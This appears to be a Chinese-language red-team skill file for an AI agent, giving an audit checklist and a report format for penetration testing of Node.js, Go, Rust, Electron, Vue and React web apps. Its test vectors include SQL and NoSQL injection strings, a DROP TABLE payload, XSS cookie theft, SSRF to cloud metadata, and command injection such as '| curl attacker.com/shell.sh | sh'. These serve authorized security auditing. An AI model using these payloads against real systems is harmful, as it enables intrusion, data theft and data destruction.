# 红队安全技能

> 针对使用 Node.js、Go、Rust、Electron、Vue、React、TypeScript、MySQL、PostgreSQL、MongoDB 构建的 Web 应用的攻击模拟与渗透测试技能。

## 目的

以 Google Project Zero 级别的高级红队操作员身份行动。通过静态分析、动态测试策略和攻击面映射，系统性地发现目标代码库中的漏洞。所有操作仅限于**用户自有系统的授权测试**。

## 使用方式

当此技能被激活时，按以下顺序执行：

1. **侦察** — 绘制攻击面
2. **静态分析** — 审计源代码中的漏洞
3. **攻击计划** — 按严重程度生成漏洞利用场景
4. **概念验证** — 为每个发现提供可复现的 PoC
5. **报告** — 输出结构化的漏洞报告

---

## 第一阶段：侦察与攻击面映射

### 1.1 技术栈指纹识别

```
识别内容：
- 包管理器：package.json、go.mod、Cargo.toml
- 框架版本：Express/Koa/Fastify、Gin/Echo/Fiber、Actix/Axum、Vue/React
- 数据库驱动：mysql2、pg、mongoose/mongodb、sqlx、diesel
- 认证库：jsonwebtoken、passport、oauth2、session 中间件
- Electron 版本及配置（主进程 vs 渲染进程）
```

### 1.2 入口点枚举

```
映射所有入口点：
- HTTP 路由（REST/GraphQL 端点）
- WebSocket 处理器
- IPC 通道（Electron 主进程 <-> 渲染进程）
- CLI 参数解析
- 文件上传端点
- 定时任务 / 后台工作器
- 消息队列消费者
```

### 1.3 信任边界分析

```
识别信任边界：
- 用户输入 -> 服务器（HTTP body、query、headers、cookies）
- 渲染进程 -> 主进程（Electron IPC）
- 服务器 -> 数据库（查询构造）
- 服务器 -> 外部 API（SSRF 攻击面）
- 客户端 -> 服务器（JWT/会话验证点）
- 文件系统访问点
```

---

## 第二阶段：漏洞审计清单

### 2.1 注入攻击

#### SQL 注入（MySQL / PostgreSQL）

```
搜索模式：
- 原始查询拼接：query(`SELECT * FROM users WHERE id = ${id}`)
- 字符串拼接构造查询
- 缺少参数化查询
- ORM 原始查询方法：sequelize.query()、knex.raw()、sqlx::query()
- 存储过程调用中使用用户输入
- ORDER BY / LIMIT 注入（经常被忽略）

测试向量：
- ' OR '1'='1' --
- 1; DROP TABLE users; --
- ' UNION SELECT null,username,password FROM users --
- 1 AND (SELECT SLEEP(5))（基于时间的盲注）
```

#### NoSQL 注入（MongoDB）

```
搜索模式：
- db.collection.find({ user: req.body.user })  // 对象注入
- 使用用户输入的 $where 子句
- 未过滤的 $regex
- JSON.parse() 将用户输入转为查询操作符

测试向量：
- {"username": {"$gt": ""}, "password": {"$gt": ""}}
- {"username": {"$regex": ".*"}}
- {"$where": "this.password == 'x' || true"}
```

#### 命令注入

```
搜索模式（Node.js）：
- child_process.exec(userInput)
- child_process.execSync()
- spawn() 中的 shell: true 选项
- eval()、Function()、vm.runInNewContext()

搜索模式（Go）：
- exec.Command("sh", "-c", userInput)
- os/exec 使用未过滤的参数

搜索模式（Rust）：
- std::process::Command::new("sh").arg("-c").arg(user_input)
- 包含 FFI 调用的 unsafe 块

测试向量：
- ; cat /etc/passwd
- $(whoami)
- `id`
- | curl attacker.com/shell.sh | sh
```

### 2.2 跨站脚本攻击（XSS）

#### Vue.js 特有

```
搜索模式：
- 使用用户数据的 v-html 指令
- 通过 innerHTML 渲染原始 HTML
- 从用户输入编译模板：Vue.compile(userString)
- URL 绑定：:href="userInput"（javascript: 协议）
- 动态组件：:is="userInput"

测试向量：
- <img src=x onerror=alert(1)>
- javascript:alert(document.cookie)
- {{constructor.constructor('alert(1)')()}}
```

#### React 特有

```
搜索模式：
- dangerouslySetInnerHTML={{ __html: userInput }}
- href={userInput} 未验证协议
- 服务端渲染中使用未过滤的数据
- ref.current.innerHTML = userInput

测试向量：
- <img src=x onerror=alert(1)>
- javascript:alert(1)（在 href 中）
- data:text/html,<script>alert(1)</script>
```

#### Electron 特有（严重）

```
搜索模式：
- BrowserWindow 中 nodeIntegration: true
- contextIsolation: false
- webSecurity: false
- shell.openExternal(userURL) 未做验证
- 在主窗口中加载远程内容
- 不安全的 IPC：ipcMain.on() 未做输入验证
- preload 脚本通过 contextBridge 暴露危险 API

影响：Electron 中的 XSS = 远程代码执行（RCE）
```

### 2.3 认证与授权

```
审计清单：
- JWT 密钥强度（硬编码？弱密钥？在环境变量中？）
- JWT 算法混淆攻击（alg:none、RS256->HS256）
- Token 过期设置
- 缺少 Token 撤销机制
- 会话固定攻击
- 密码重置流程漏洞
- OAuth state 参数验证
- RBAC/ABAC 绕过（通过直接对象引用的 IDOR）
- 登录/OTP 端点缺少速率限制
- 撞库攻击防护

搜索模式：
- jwt.sign() / jwt.verify() 配置
- 硬编码密钥："secret"、"password"、"key123"
- 受保护路由缺少中间件
- req.user.id vs req.params.id（IDOR）
```

### 2.4 服务端请求伪造（SSRF）

```
搜索模式：
- fetch(userURL)、axios.get(userURL)、http.Get(userURL)
- 使用用户 URL 的图片/PDF 渲染
- Webhook URL 配置
- URL 解析不一致

测试向量：
- http://127.0.0.1:3000/admin
- http://169.254.169.254/latest/meta-data/（云元数据）
- http://[::1]:3000/
- file:///etc/passwd
- gopher://internal-service:port/
```

### 2.5 反序列化与原型链污染

```
Node.js 原型链污染：
- 深度合并函数：_.merge()、lodash.defaultsDeep()
- JSON.parse() -> 递归赋值
- Object.assign() 使用用户可控的键
- 查询字符串解析器（qs 库）

测试向量：
- {"__proto__": {"isAdmin": true}}
- {"constructor": {"prototype": {"isAdmin": true}}}

Go 反序列化：
- encoding/gob 处理不可信输入
- json.Unmarshal 到 interface{}

Rust 反序列化：
- serde 处理不可信输入且缺少 #[serde(deny_unknown_fields)]
```

### 2.6 依赖供应链

```
审计命令：
- npm audit / yarn audit / pnpm audit
- go list -m -json all | nancy sleuth（Go）
- cargo audit（Rust）
- 检查包名拼写劫持（typosquatting）
- 审查 package.json 中的 postinstall 脚本
- 检查已知恶意包
- 验证 lock 文件完整性
```

### 2.7 文件上传与路径穿越

```
搜索模式：
- multer/formidable 未做文件类型验证
- 路径构造：path.join(base, userInput)
- 缺少文件名过滤
- 提供上传文件下载时缺少 Content-Disposition
- 符号链接跟随

测试向量：
- ../../../etc/passwd
- ....//....//etc/passwd
- 文件名包含空字节：file.php%00.jpg
- 嵌入 JavaScript 的 SVG
- .htaccess / web.config 上传
```

### 2.8 竞态条件

```
搜索模式：
- 先检查再执行的模式中缺少锁
- 余额/库存操作缺少事务
- 文件操作中的 TOCTOU（检查时间/使用时间）
- 缺少数据库事务隔离
- 有状态操作的并发请求处理

测试方法：
- 同时发送多个相同请求
- 测试双花场景
- 测试相同邮箱并发注册
```

### 2.9 GraphQL 特有

```
搜索模式：
- 生产环境开启了 Introspection
- 缺少查询深度限制
- 缺少查询复杂度分析
- 批量攻击（多操作）
- 字段建议信息泄露
- 授权是否在 resolver 层检查？
```

---

## 第三阶段：语言特有深度审计

### Node.js / TypeScript

```
关键模式：
- eval()、new Function()、vm 模块处理用户输入
- Buffer 分配：Buffer(userNumber) -> 未初始化内存泄露
- 正则表达式 DoS（ReDoS）：/^(a+)+$/.test(userInput)
- 事件循环阻塞 -> DoS
- 未处理的 Promise 拒绝 -> 进程崩溃
- TypeScript 'any' 类型绕过类型安全
- ts-ignore/ts-expect-error 隐藏真实问题
```

### Go

```
关键模式：
- goroutine 泄漏（缺少 context 取消）
- 竞态条件（缺少 mutex，使用 -race 标志检测）
- 32 位转换中的整数溢出
- unsafe 包的使用
- 缺少错误处理（err != nil）
- 模板注入：template.HTML(userInput)
- append 后切片头复用
```

### Rust

```
关键模式：
- unsafe 块（审计所有使用）
- 对用户可控输入调用 .unwrap() -> panic -> DoS
- release 模式下的整数溢出（wrapping 行为）
- unsafe 代码中的释放后使用（use-after-free）
- FFI 边界问题
- 内存泄漏（Rc 循环引用、forget()）
- 密码比较中的时序侧信道
```

### Electron

```
关键模式：
- 使用 remote 模块（已弃用，危险）
- 渲染进程开启 nodeIntegration
- 禁用 contextIsolation
- 不安全的 CSP 或缺少 CSP
- 自定义协议处理器漏洞
- 自动更新器未做签名验证
- 深层链接 / 自定义 URI scheme 劫持
```

---

## 第四阶段：报告格式

对每个发现，按以下格式输出：

```markdown
### [严重程度] 发现标题

- **分类**：OWASP 类别
- **位置**：file:line_number
- **CWE**：CWE-XXX
- **CVSS**：X.X（如适用）

**描述**：漏洞是什么。

**概念验证**：
（分步复现 / 代码片段）

**影响**：攻击者可以实现什么。

**修复建议**：具体修复方案及代码示例。

**参考资料**：相关文档链接。
```

严重程度等级：严重 > 高危 > 中危 > 低危 > 信息

---

## 自动化扫描命令

```bash
# Node.js 依赖审计
npm audit --json

# Go 漏洞检查
govulncheck ./...

# Rust 安全审计
cargo audit
cargo clippy -- -W clippy::all

# 密钥扫描
grep -rn "password\|secret\|api_key\|token\|private_key" --include="*.ts" --include="*.go" --include="*.rs" --include="*.js" --include="*.vue" .

# 查找硬编码的 IP/URL
grep -rn "http://\|https://\|127\.0\.0\|localhost" --include="*.ts" --include="*.go" --include="*.rs" .

# 检查危险函数
grep -rn "eval\|exec\|execSync\|Function(" --include="*.ts" --include="*.js" .
grep -rn "v-html\|dangerouslySetInnerHTML" --include="*.vue" --include="*.tsx" --include="*.jsx" .
grep -rn "unsafe {" --include="*.rs" .
```

---

## 参考资料

详见 `references/` 目录中各技术栈的攻击手册。
